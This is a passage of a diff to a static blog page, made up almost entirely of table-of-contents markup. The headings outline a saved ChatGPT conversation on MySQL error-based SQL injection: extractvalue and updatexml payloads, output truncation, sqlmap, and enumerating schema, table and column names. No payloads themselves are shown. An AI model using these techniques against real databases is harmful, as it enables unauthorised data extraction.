class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-1"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E7%9A%84%E9%99%90%E5%88%B6%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">✅ 一、常见报错注入函数的限制分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-extractvalue-xml-xpath"><span class="toc-number">1.</span> <span class="toc-text">1. extractvalue(xml, xpath)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-updatexml-xml-xpath-value"><span class="toc-number">2.</span> <span class="toc-text">2. updatexml(xml, xpath, value)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-floor-rand-%E6%8A%A5%E9%94%99%E6%96%B9%E5%BC%8F%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E-MySQL-5-x%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3. floor() + rand() 报错方式（适用于 MySQL 5.x）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%91%E7%94%9F%E4%BA%86%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 二、如何判断是否发生了长度截断？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%B3%95-1%EF%BC%9A%E4%B8%8D%E6%96%AD%E5%A2%9E%E9%95%BF%E9%95%BF%E5%BA%A6%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.</span> <span class="toc-text">✅ 方法 1：不断增长长度确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%B3%95-2%EF%BC%9A%E6%8A%A5%E9%94%99%E5%86%85%E5%AE%B9%E5%89%8D%E5%90%8E%E7%BC%BA%E5%A4%B1"><span class="toc-number">2.</span> <span class="toc-text">✅ 方法 2：报错内容前后缺失</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%88%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%8A%80%E5%B7%A7%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 三、解决办法（建议使用以下技巧）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%8F%AF%E9%80%89%E6%9B%BF%E4%BB%A3%E7%AD%96%E7%95%A5%EF%BC%88%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 四、可选替代策略（自动化工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A0-%E7%94%A8-sqlmap-%E6%8E%A7%E5%88%B6%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🛠 用 sqlmap 控制数据长度：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="toc-number"></span> <span class="toc-text">✅ 五、实战建议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-1"><span class="toc-number">0.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-2"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 问题总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A5-%E9%97%AE%E9%A2%98%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🔥 问题点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%81%9A%E6%B3%95%EF%BC%9A%E9%99%90%E5%AE%9A%E5%BA%93%E5%90%8D-%E8%A1%A8%E5%90%8D-%E5%88%86%E6%89%B9%E8%AF%BB%E5%8F%96"><span class="toc-number"></span> <span class="toc-text">✅ 正确做法：限定库名+表名 + 分批读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E7%88%86%E5%87%BA%E6%9F%90%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E6%8E%A8%E8%8D%90%E5%86%99%E6%B3%95%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">✅ 一、爆出某表字段名（推荐写法）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E9%80%90%E8%A1%8C%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88LIMIT-%E5%88%86%E9%A1%B5%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">✅ 二、逐行爆字段名（LIMIT 分页方式）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%A6%82%E6%9E%9C%E4%BB%8D%E7%84%B6%E8%B6%85%E9%95%BF%EF%BC%8C%E6%94%B9%E4%B8%BA-substr-%E6%8E%A7%E5%88%B6%E5%8D%95%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number"></span> <span class="toc-text">✅ 三、如果仍然超长，改为 substr() 控制单个字段名长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%AE%9E%E7%94%A8%E8%BE%85%E5%8A%A9%E4%BF%A1%E6%81%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%BD%93%E5%89%8D%E5%BA%93%E5%90%8D%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 四、实用辅助信息：如何知道当前库名？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 五、小结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-2"><span class="toc-number">0.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-3"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E5%8E%9F%E5%A7%8B%E9%94%99%E8%AF%AF-Payload"><span class="toc-number"></span> <span class="toc-text">❌ 原始错误 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">❌ 存在的问题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F%EF%BC%88%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 正确语法格式（爆数据库名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%A6%82%E6%9E%9C%E5%9B%9E%E6%98%BE%E4%B8%8D%E5%85%A8%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 如果回显不全怎么办？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%AD%97%E7%AC%A6%E8%BF%87%E9%95%BF%E6%8A%A5%E9%94%99%E6%8F%90%E7%A4%BA%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 字符过长报错提示？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%BD%93%E5%89%8D%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E7%88%86%E5%87%BA%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 快速测试当前是否成功爆出：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%85%B6%E4%BB%96%E6%8E%A8%E8%8D%90-payload%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 其他推荐 payload（报错注入常用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BD%93%E5%89%8D%E8%A1%A8%E5%90%8D%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">爆当前表名（已知库名）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E5%B7%B2%E7%9F%A5%E8%A1%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">爆字段名（已知表）：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-3"><span class="toc-number">2.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-4"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%97-%E9%97%AE%E9%A2%98%E7%8E%B0%E8%B1%A1"><span class="toc-number"></span> <span class="toc-text">❗ 问题现象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">✅ 原因分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-group-concat-%E6%98%AF%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E7%94%A8-LIMIT-%E6%8E%A7%E5%88%B6%E5%AE%83%E7%9A%84%E8%A1%8C%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">⚠️ group_concat(...) 是聚合函数，不能直接用 LIMIT 控制它的行！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 正确写法对比：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE-payload-%E5%86%99%E6%B3%95%EF%BC%88%E9%80%90%E6%9D%A1%E6%9E%9A%E4%B8%BE-schema-%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 正确 payload 写法（逐条枚举 schema 名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E5%AE%8C%E6%95%B4%E4%B8%80%E6%9D%A1%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 示例完整一条：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%8F%AF%E9%80%89%E6%8A%80%E5%B7%A7%EF%BC%9A%E7%88%86%E6%89%80%E6%9C%89%E5%BA%93%E5%90%8D%E6%97%B6%E6%8E%A7%E5%88%B6%E9%95%BF%E5%BA%A6"><span class="toc-number"></span> <span class="toc-text">✅ 可选技巧：爆所有库名时控制长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 小总结</span></a>
+      </div>
+    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -194,6 +702,8 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
